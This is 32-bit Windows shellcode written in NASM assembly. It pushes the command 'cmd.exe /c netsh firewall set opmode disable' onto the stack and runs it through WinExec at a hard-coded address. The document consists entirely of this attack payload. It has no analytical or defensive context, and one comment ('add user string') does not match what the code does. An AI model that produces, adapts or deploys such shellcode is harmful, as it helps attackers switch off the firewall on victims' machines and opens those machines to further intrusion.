[BITS 32]

global _start			

section .text
_start:

    xor edx, edx	; zero out edx
    push edx		; push null byte onto stack

    ; 'cmd.exe /c netsh firewall set opmode disable'
    push 0x656c6261
    push 0x73696420
    push 0x65646f6d
    push 0x706f2074
    push 0x6573206c
    push 0x6c617765
    push 0x72696620
    push 0x68737465
    push 0x6e20632f
    push 0x20657865
    push 0x2e646d63    

    mov ebx, esp	; save stack pointer 

    inc edx		; uCmdShow SW_SHOWNORMAL
    push edx    

    push ebx		; push pointer to add user string 
    mov edx, 0x7c8623ad	; mov address of WinExec()
    call edx
